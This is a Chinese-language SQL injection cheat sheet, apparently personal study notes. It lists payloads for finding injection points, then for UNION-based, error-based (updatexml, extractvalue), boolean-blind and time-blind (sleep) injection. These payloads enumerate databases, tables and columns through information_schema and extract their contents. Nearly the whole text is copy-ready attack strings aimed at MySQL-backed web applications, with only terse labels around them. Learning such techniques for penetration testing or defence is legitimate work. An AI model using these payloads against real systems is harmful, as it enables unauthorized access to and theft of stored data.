## 注入点判断

①单双引号

有报错说明存在sql注入，没有报错可能是被拦截

```
id=1'
id=1"
```

②and

一个正常返回一个返回异常说明存在注入,可以判断出类型

```
id=1 and 1=1
id=1 and 1=2

id=1' and '1'='1
id=1' and '1'='2
```

③+-运算符

能正常返回说明存在数字型注入

```
id=1+1
id=1+2
```

## 联合注入

利用`union seletc`进行联合注入

条件：①知道有多少列，可以通过order by确定 ②每一列对应数据类型一致

爆出所有数据库：
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata-- s

爆出数据表：

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='**数据库名**'-- s

爆出表的字段：

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='**数据库名**' and table_name='**表名**'-- s

爆出数据：

?id=-1' union select 1,2,group_concat(0x7e,**字段**,0x7e) from **数据库名.数据表名**-- s

## 函数报错注入

### updatexml函数

`updatexml(xml_document,XPthstring,new_value)` 只能返回32字节数据

爆出所有数据库：

```
1' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31)),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31)),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31)),1)-- s
```

爆出当前数据库信息：

```
1'and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)-- s
```

爆出当前数据库的所有表：

```
1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,31),0x7e),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),63,31),0x7e),1)-- s
```

爆出字段信息：

```
1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),1,31),0x7e),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),32,31),0x7e),1)-- s

1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),63,31),0x7e),1)-- s
```

爆出数据：

```
1' and updatexml(1,concat(0x7e,substr((select group_concat(**字段) from 数据库名.数据表名),1,31),0x7e),1)-- s
1' and updatexml(1,concat(0x7e,substr((select group_concat(**字段) from 数据库名.数据表名),32,31),0x7e),1)-- s
1' and updatexml(1,concat(0x7e,substr((select group_concat(**字段) from 数据库名.数据表名),63,31),0x7e),1)-- s
```

### extractvalue函数

`extractvalue (XML_document, XPath_string)`只能返回32字节数据

爆出当前数据库信息：

```
1'and extractvalue(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir))-- s
```

爆出当前数据库的表：

```
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- s
```

爆出字段信息：

```
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),0x7e)) -- s
```

爆出数据：

```
1' and extractvalue(1,concat(0x7e,(select group_concat(0x7e,**字段,0x7e) from 数据库名.数据表名))) -- s
```

## 布尔盲注

**猜解当前数据库名称长度**

```
?id=1' and (length(database()))=1-- s
?id=1' and (length(database()))=2-- s
```

**猜解当前数据库名称**

```
?id=1' and ascii(substr(database(),1,1))=48-- s
#范围可以是48-122，变量是ascii码数
```

**猜当前数据库表名**

```
?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=48-- s

?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))=48-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

**猜字段名**

```
?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 1,1),1,1)))=48-- s

?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 1,1),2,1)))=48-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

**猜内容** 

```
?id=1' and (ascii(substr((select 单个字段 from 数据库名.表名 limit 0,1),1,1)))=48-- s

?id=1' and (ascii(substr((select 单个字段 from 数据库名.表名 limit 0,1),2,1)))=48-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

## 时间盲注

**猜解当前数据库名称长度**

```
?id=1' and if((length(database()))=1,sleep(3),1)-- s
?id=1' and if((length(database()))=2,sleep(3),1)-- s
#比布尔盲注多一个if语句
```

**猜解当前数据库名称**

```
?id=1' and if(ascii(substr(database(),1,1))=48,sleep(3),1)-- s
#范围可以是48-122，变量是ascii码数
```

**猜当前数据库表名**

```
?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=48,sleep(3),1)-- s

?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))=48,sleep(3),1)-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

**猜字段名**

```
?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 1,1),1,1)))=48,sleep(3),1)-- s

?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 1,1),2,1)))=48,sleep(3),1)-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

**猜内容** 

```
?id=1' and if((ascii(substr((select 单个字段 from 数据库名.表名 limit 0,1),1,1)))=48,sleep(3),1)-- s

?id=1' and if((ascii(substr((select 单个字段 from 数据库名.表名 limit 0,1),2,1)))=48,sleep(3),1)-- s
#范围可以是48-122，变量是ascii码数和substr的字符
```

